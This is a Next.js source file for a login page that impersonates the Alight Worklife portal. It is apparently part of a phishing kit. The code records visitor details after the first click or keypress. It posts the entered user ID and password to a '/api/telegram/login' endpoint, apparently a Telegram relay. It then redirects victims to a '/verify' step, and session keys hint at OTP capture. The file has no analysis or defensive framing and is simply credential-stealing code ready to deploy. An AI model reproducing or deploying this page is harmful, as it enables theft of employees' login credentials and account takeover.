"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordField, setShowPasswordField] = useState(false);
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [fieldErrors, setFieldErrors] = useState<{ userid?: string }>({});
  const [honeypot, setHoneypot] = useState("");
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const clearErr = (fieldId: string) => {
    setFieldErrors((prev) => ({
      ...prev,
      [fieldId]: undefined,
    }));
  };

  const handleUsernameFocus = () => {
    setShowPasswordField(true);
  };

  const validate = (): boolean => {
    let ok = true;
    const errors: typeof fieldErrors = {};

    if (!username.trim()) {
      errors.userid = "Please enter your User ID.";
      ok = false;
    }

    if (showPasswordField && !password.trim()) {
      // attach an error to a generic field so it displays
      errors.userid = errors.userid || "Please enter your password.";
      ok = false;
    }

    setFieldErrors(errors);
    return ok;
  };

  const handleSignIn = async () => {
    if (isLoginLoading) return;
    if (!validate()) return;

    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }

    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });

      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      redirectRef.current = window.setTimeout(() => {
        router.push("/verify");
      }, 1800);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <div className="flex min-h-screen flex-col bg-white">
      <header>
        <div className="h-3 bg-linear-to-r from-[#f2c94c] via-[#34d6c3] to-[#34d6c3]" />
        <div className="border-b border-gray-400 px-8 py-9">
          <img src="/images/logo.svg" alt="logo" className="w-[16.25rem]" />
        </div>
      </header>

      <main className="mx-auto mt-5 flex-1">
        <div className="py-5 md:p-3 lg:w-full lg:p-4">
          <h1 className="mb-7 text-center text-2xl font-semibold leading-tight text-gray-900 md:text-4xl">
            Welcome to Alight Worklife
          </h1>
          <div className="w-full max-w-[30rem] rounded-xl border border-gray-300 bg-white p-10 shadow-sm">
            <h2 className="mb-6 text-2xl font-semibold">Enter your user ID.</h2>
            <p className="mb-4 text-gray-600">
              * Fields marked with an asterisk (*) are required
            </p>
            <label className="mb-2 block text-sm font-medium text-gray-700">
              User ID*
            </label>
            <input
              type="text"
              value={username}
              onChange={(e) => {
                setUsername(e.target.value);
                clearErr("userid");
              }}
              onFocus={handleUsernameFocus}
              onClick={handleUsernameFocus}
              className="h-18 w-full border border-gray-700 px-4 outline-none transition hover:border-blue-600 focus:ring-2 focus:ring-blue-500"
            />
            <div className="mt-4 text-right">
              <a href="#" className="text-blue-600 underline">
                Don&apos;t have user ID?
              </a>
            </div>
            {fieldErrors.userid && (
              <p className="mt-3 text-sm text-red-600">{fieldErrors.userid}</p>
            )}
            {loginError && (
              <p className="mt-3 text-sm text-red-600">{loginError}</p>
            )}
            {showPasswordField && (
              <>
                <label className="mb-2 mt-4 block text-sm font-medium text-gray-700">
                  Password*
                </label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="h-18 w-full border border-gray-700 px-4 outline-none transition hover:border-blue-600 focus:ring-2 focus:ring-blue-500"
                />
              </>
            )}
            <button
              type="button"
              onClick={handleSignIn}
              disabled={isLoginLoading || !username.trim() || (showPasswordField && !password.trim())}
              className="mt-10 rounded-full bg-gray-400 px-8 py-4 text-white transition disabled:cursor-not-allowed disabled:opacity-70"
            >
              {isLoginLoading ? "SIGNING IN..." : "Next"}
            </button>
          </div>
        </div>
      </main>

      <footer className="bg-[#F5F5F5]">
        <div className="mx-auto max-w-7xl px-8 py-12">
          <div className="flex flex-col gap-12 md:flex-row lg:flex-row lg:justify-between">
            <div className="space-y-8 text-[20px]">
              <a href="#" className="block text-blue-700 underline">
                Contact Us
              </a>
              <a href="#" className="block text-blue-700 underline">
                Feedback
              </a>
              <a href="#" className="block text-blue-700 underline">
                Protect Yourself From Website Fraud
              </a>
            </div>
            <div className="flex flex-col items-start lg:items-center">
              <img
                src="/images/alight_worklife_logo_black.svg"
                alt="footer logo"
                className="mb-6 h-14"
              />
              <div className="flex gap-4">
                <img
                  src="/images/alight-worklife-app-store.png"
                  alt="App Store"
                  className="h-12"
                />
                <img
                  src="/images/alight-worklife-google-play.png"
                  alt="Google Play"
                  className="h-12"
                />
              </div>
            </div>
          </div>

          <hr className="my-10 border-gray-500" />

          <div className="flex flex-col gap-8 lg:flex-row lg:justify-between">
            <div className="flex flex-wrap gap-4 text-[16px]">
              <a href="#" className="text-blue-700 underline">
                Privacy Policy
              </a>
              <a href="#" className="text-blue-700 underline">
                Terms of Use
              </a>
              <a href="#" className="text-blue-700 underline">
                Cookie Notice
              </a>
              <a href="#" className="text-blue-700 underline">
                Cookie Settings[Do Not Sell or Share My Personal Information]
              </a>
            </div>
            <p className="text-[16px] text-gray-600">
              &copy; 2026 Alight Solutions. All rights reserved.
            </p>
          </div>
        </div>
      </footer>

      <div className="fixed bottom-8 right-8 flex h-16 w-16 cursor-pointer items-center justify-center rounded-full bg-blue-600 shadow-xl transition hover:bg-blue-700">
        <img src="/images/chatbox.png" alt="Chat Box" className="h-8 w-8" />
      </div>
    </div>
  );
}
